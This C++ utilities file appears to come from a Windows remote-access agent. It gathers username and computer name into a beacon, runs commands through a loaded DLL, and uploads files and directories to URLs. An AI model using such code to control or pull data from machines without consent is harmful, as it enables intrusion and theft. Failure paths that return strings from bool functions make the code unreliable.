// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 


//#pragma warning(disable : 4996)     // To ignore warning C4996: 'GetVersionExW': was declared deprecated

#include "utilities.h"
#include <sys/stat.h>
#include <random>
#include <fstream>
#include "json.h"
#include <iostream>
#include <lmcons.h>
#include <codecvt>
#include <sstream>
#include "systemInformation.h"
#include "stringUtil.h"
#include <cctype>


typedef bool(*DownloadFileFromURLType)(const std::wstring&, const std::wstring&, const std::wstring&);
typedef bool(*UploadFileToURLType)(const std::wstring&, const std::wstring&, const std::wstring&);
typedef bool(*UploadDirectoryToURLType)(const std::wstring&, const std::wstring&, const std::wstring&, const std::wstring&);

typedef std::wstring(*FileMangerType)(const std::wstring&);
typedef std::wstring(*ExecuteCommandType)(const std::wstring&, const std::wstring&);


//std::string xorEncryptDecrypt(const std::string& data, const std::string& key) {
//
//	if (data.empty() || key.empty()) {
//		std::cerr << "data or key is Empty!" << std::endl;
//		return std::string();
//	}
//	std::string decryptedData;
//	size_t keyLength = key.length();
//
//	for (size_t i = 0; i < data.length(); ++i) {
//		unsigned char decryptedByte = data[i] ^ key[i % keyLength];
//		decryptedData += decryptedByte;
//	}
//	return decryptedData;
//}

bool isValidPort(const std::string& portNum) {

	for (char c : portNum) {
		if (!std::isdigit(c)) {
			std::cerr << "PORT is invalid, please put only the number for PORT [1 - 65535]\n";
			return false;
		}
	}
	try {
		int port = std::stoi(portNum);
		if (port < 1 || port > 65535) {
			std::cerr << "PORT is invalid, please select a PORT in the range [1 - 65535]\n";
			return false;
		}
	}
	catch (const std::invalid_argument&) {
		std::cerr << "PORT is invalid, please enter a valid number in the range [1 - 65535]\n";
		return false;
	}
	catch (const std::out_of_range&) {
		std::cerr << "PORT is invalid, number out of range\n";
		return false;
	}
	return true;
}

std::wstring changeDir(const std::wstring& newPath, std::error_code& ec) {
    fs::path newDirectory(newPath);
    if (fs::exists(newDirectory, ec) && fs::is_directory(newDirectory, ec)) {
        fs::current_path(newDirectory, ec); // Change the current directory to newPath
        if (!ec) {
            return fs::current_path().wstring(); // Return the new current directory path
        }
    }
    return std::wstring(); // Return an empty string if there was an error
}

std::wstring getExecutableDir(void) {
    WCHAR buffer[MAX_PATH];
    GetModuleFileNameW(nullptr, buffer, MAX_PATH);
    std::wstring fullPath(buffer);
    std::wstring directory = fullPath.substr(0, fullPath.find_last_of(L"\\/\\"));
    return directory;
}

bool writeFileContents(const std::string& filename, const std::string& fileContent) {
    std::ofstream file(filename, std::ofstream::out | std::ofstream::binary); // Create a file with the given filename
    if (file.is_open()) {
        file << fileContent; // Write the content to the file
        file.close(); // Close the file
    //    std::cout << "File created successfully: " << filename << std::endl;
        return true;
    }
    else {
    //    std::cerr << "Unable to create file: " << filename << std::endl;
        return false;
    }
}

std::wstring extractFilename(const std::wstring& filePath) {
    const size_t lastSlash = filePath.find_last_of(L"/\\"); // Find the last slash or backslash
    if (lastSlash != std::wstring::npos) {
        return filePath.substr(lastSlash + 1); // Extract the filename part
    }
    return filePath; // If no slashes or backslashes found, return the original path as the filename
}

std::wstring ExtractLastDirectoryName(const std::wstring& path) {
    std::wstringstream ss(path);
    std::wstring directory;
    std::wstring lastDirectory;
    while (std::getline(ss, directory, L'/')) {
        if (!directory.empty()) {
            lastDirectory = directory;
        }
    }
    return lastDirectory;
}

bool isExecutable(const std::wstring& path) {
    struct _stat fileInfo;
    if (_wstat(path.c_str(), &fileInfo) != 0) {
        std::wcerr << L"Error getting file info." << std::endl;
        return false;
    }
    // Check if the file is a regular file and has execute permission for user
    if ((fileInfo.st_mode & _S_IFREG) && (fileInfo.st_mode & _S_IEXEC)) {
        return true;
    }
    return false;
}

//size_t calculateDirectorySize(const std::wstring& path) {
//    size_t size = 0;
//    std::error_code ec;
//
//    for (const auto& entry : fs::directory_iterator(path, fs::directory_options::skip_permission_denied, ec)) {
//        auto fileType = fs::status(entry, ec).type();
//        if (!ec) {
//            if (fileType == fs::file_type::regular)
//                size += fs::file_size(entry.path(), ec);
//            else if (fileType == fs::file_type::directory) {
//                size_t subDirectorySize = calculateDirectorySize(entry.path().wstring());
//                if (subDirectorySize == static_cast<size_t>(-1)) {
//                    return static_cast<size_t>(-1);  // Return an error state
//                }
//                size += subDirectorySize;
//            }
//        }
//        else {
//            return static_cast<size_t>(-1);  // Return an error state
//        }
//    }
//    return size;
//}

std::string generateRandomAlphanumeric(const int &length, const long long &seed) {
	std::string alphanumeric = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::mt19937_64 rng(seed);
	std::uniform_int_distribution<int> dist(0, alphanumeric.length() - 1);

	std::string result;
	for (int i = 0; i < length; ++i) {
		result += alphanumeric[dist(rng)];
	}
	return result;
}

std::wstring getSysInfoInJson() {

	std::vector<std::wstring> data_vec;
	std::wstring computerName = SysInformation::getComputerName();

	// Generate the seed from time and computer name
	std::time_t currentTime = std::time(nullptr);
	std::wstring seedString = std::to_wstring(currentTime) + computerName;
	std::hash<std::wstring> seedHash;
	long long seed = static_cast<long long>(seedHash(seedString));
	const int randomNumberLength{ 15 };
	// Generate a random alphanumeric number
	std::string randomAlphanumeric = generateRandomAlphanumeric(randomNumberLength, seed);
	data_vec.push_back(L"id");
	data_vec.push_back(StringUtils::s2ws(randomAlphanumeric));
	std::wstring username = SysInformation::getUserName();

	// Get system information
//    OSVERSIONINFO osVersionInfo;
//    osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
//    GetVersionEx(&osVersionInfo);

	data_vec.push_back(L"username");
	data_vec.push_back(username);
	data_vec.push_back(L"computerName");
	data_vec.push_back(computerName);
	data_vec.push_back(L"OSname");
	data_vec.push_back(L"Windows");
	//    data_vec.push_back(std::to_wstring(osVersionInfo.dwMinorVersion));
	//    data_vec.push_back(L"OSversion");
	//    data_vec.push_back(std::to_wstring(osVersionInfo.dwMajorVersion));
	//    std::cerr << "major version : " << osVersionInfo.dwMajorVersion << " |  minor : " << osVersionInfo.dwMinorVersion << std::endl;

	return JsonUtil::to_json(data_vec);
}

std::string extractBase64Data(const std::wstring& buff) {
    std::size_t found = buff.find(L"\r\n\r\n");
    if (found != std::wstring::npos) {
        found += std::wstring(L"\r\n\r\n").length();
        return StringUtils::ws2s(buff.substr(found));
    }
    else {
        return std::string("");
    }
}

std::wstring ReplaceTildeWithPathWindows(const std::wstring& filePath) {
    std::wstring result = filePath;
    size_t tildePos = result.find('~');
    if (tildePos != std::string::npos) {
        std::wstring homeDir = L"C:/users/" + SysInformation::getUserName();
        result.replace(tildePos, 1, homeDir);
    }
    return result;
}

bool IscmdletAvailable(const std::wstring &cmdlet) {
	const std::wstring command = L"powershell";
	const std::wstring args = L"Get-Command " + cmdlet;

	HMODULE hExecLib = LoadLibrary(TEXT("executeCommands.dll"));
	if (hExecLib == NULL) {
		std::wcerr <<  L"IscmdletAvailable(): Failed to load executeCommands.dll";
		return false;
	}
	const std::wstring output = executeCommandViaDll(hExecLib, command, args);
	FreeLibrary(hExecLib);

	std::wstring pattern = L"The term '" + cmdlet + L"' is not recognized";
	if (output.find(pattern) != std::wstring::npos) {
		// couldn't found the input cmdlet
		return false;
	}
	// cmdlet is available
	return true;
}

std::wstring findCompressionUtility(std::wstring &outputCompressionUtilityPath) {
	std::error_code ec;		// to avoid exception
	if (IscmdletAvailable(L"Compress-Archive")) {
		outputCompressionUtilityPath = std::wstring();
		return std::wstring(L"Compress-Archive");
	}
	else if (fs::exists("C:\\Program Files\\WinRAR", ec)) {
		outputCompressionUtilityPath = L"C:\\Program Files\\WinRAR";
		return std::wstring(L"WinRAR");
	}
	else if (fs::exists("C:\\Program Files (x86)\\WinRAR", ec)) {
		outputCompressionUtilityPath = L"C:\\Program Files (x86)\\WinRAR";
		return std::wstring(L"WinRAR");
	}
	else if (fs::exists("C:\\Program Files\\7-Zip", ec)) {
		outputCompressionUtilityPath = L"C:\\Program Files\\7-Zip";
		return std::wstring(L"7-Zip");
	}
	else if (fs::exists("C:\\Program Files (x86)\\7-Zip", ec)) {
		outputCompressionUtilityPath = L"C:\\Program Files (x86)\\7-Zip";
		return std::wstring(L"7-Zip");
	}
	return std::wstring();
}



bool DownloadFileFromURLViaDll(const HMODULE &hFileTransferLib, const std::wstring& url, const std::wstring& destDirPath, std::wstring& errorMsg) {
	bool exitStatus;
	DownloadFileFromURLType DownloadFileFromURL = (DownloadFileFromURLType)(GetProcAddress(hFileTransferLib, "DownloadFileFromURL"));
	if (DownloadFileFromURL == nullptr) {
		return L"Failed to get filemanager() address.";
	}
	else {
		exitStatus = DownloadFileFromURL(url, destDirPath, errorMsg);
	}
	return exitStatus;
}

bool UploadFileToURLViaDll(const HMODULE &hFileTransferLib, const std::wstring& url, const std::wstring& filePath, std::wstring &errorMsg) {
	bool exitStatus;
	UploadFileToURLType UploadFileToURL = (UploadFileToURLType)(GetProcAddress(hFileTransferLib, "UploadFileToURL"));
	if (UploadFileToURL == nullptr) {
		return L"Failed to get filemanager() address.";
	}
	else {
		exitStatus = UploadFileToURL(url, filePath, errorMsg);
	}
	return exitStatus;
}

bool UploadDirectoryToURLViaDll(const HMODULE &hFileTransferLib, const std::wstring& url, const std::wstring& dirPath, std::wstring& errorMsg, const std::wstring& extensions) {	
	bool exitStatus;
	UploadDirectoryToURLType UploadDirectoryToURL = (UploadDirectoryToURLType)(GetProcAddress(hFileTransferLib, "UploadDirectoryToURL"));
	if (UploadDirectoryToURL == nullptr) {
		return L"Failed to get filemanager() address.";
	}
	else {
		exitStatus = UploadDirectoryToURL(url, dirPath, errorMsg, extensions);
	}
	return exitStatus; 
}

std::wstring filemanagerViaDll(const HMODULE &hFilemanagerLib, const std::wstring &dirToList) {
	std::wstring exitStatus;
	FileMangerType filemanager = (FileMangerType)(GetProcAddress(hFilemanagerLib, "filemanager"));
	if (filemanager == nullptr) {
		return L"Failed to get filemanager() address.";
	}
	else {
		exitStatus = filemanager(dirToList);
	}
	return exitStatus;
}

std::wstring executeCommandViaDll(const HMODULE &hExecLib, const std::wstring& exePath, const std::wstring& arguments) {
    std::wstring exitStatus;
	ExecuteCommandType executeCommand = (ExecuteCommandType)(GetProcAddress(hExecLib, "executeCommand"));
    if (executeCommand == nullptr) {
        return L"Failed to get executeCommand() address.";
    }
    else {
        exitStatus = executeCommand(exePath, arguments);        
    }
    return exePath + L" " + exitStatus;
}

//std::wstring executeCommand(const std::wstring& command, const std::wstring& args) {
//    
//    SECURITY_ATTRIBUTES saAttr;
//    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
//    saAttr.bInheritHandle = TRUE;
//    saAttr.lpSecurityDescriptor = NULL;
//
//    HANDLE hChildStdoutRd, hChildStdoutWr;
//    if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) {
//        return L"Pipe creation failed";
//    }
//
//    HANDLE hProcess = NULL;
//    PROCESS_INFORMATION piProcInfo;
//    STARTUPINFO siStartInfo;
//
//    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
//    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
//
//    siStartInfo.cb = sizeof(STARTUPINFO);
//    siStartInfo.hStdOutput = hChildStdoutWr;
//    siStartInfo.hStdError = hChildStdoutWr;
//    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
//
//    // Create the command line
//    std::wstring fullCommand = command + L" " + args;
//    LPWSTR cmdLine = const_cast<wchar_t*>(fullCommand.c_str());
//
//    BOOL bSuccess = CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
//
//    if (!bSuccess) {
//        CloseHandle(hChildStdoutRd);
//        CloseHandle(hChildStdoutWr);
//        return L"Process creation failed";
//    }
//
//    CloseHandle(hChildStdoutWr);
//
//    // Read the output from the child process
//    DWORD dwRead;
//    CHAR chBuf[4096];
//    std::wstring output;
//
//    while (ReadFile(hChildStdoutRd, chBuf, sizeof(chBuf), &dwRead, NULL) && dwRead > 0) {
//        int numWChars = MultiByteToWideChar(CP_UTF8, 0, chBuf, dwRead, NULL, 0);
//        if (numWChars > 0) {
//            std::vector<wchar_t> wBuffer(numWChars);
//            MultiByteToWideChar(CP_UTF8, 0, chBuf, dwRead, wBuffer.data(), numWChars);
//            output.append(wBuffer.data(), numWChars);
//        }
//    }
//
//    CloseHandle(hChildStdoutRd);
//
//    // Wait for the child process to exit
//    WaitForSingleObject(piProcInfo.hProcess, INFINITE);
//
//    DWORD exitCode;
//    GetExitCodeProcess(piProcInfo.hProcess, &exitCode);
//
//    CloseHandle(piProcInfo.hProcess);
//    CloseHandle(piProcInfo.hThread);
//
//    output += L" | Child process exited with status: " + std::to_wstring(exitCode);
//
//    return output;
//}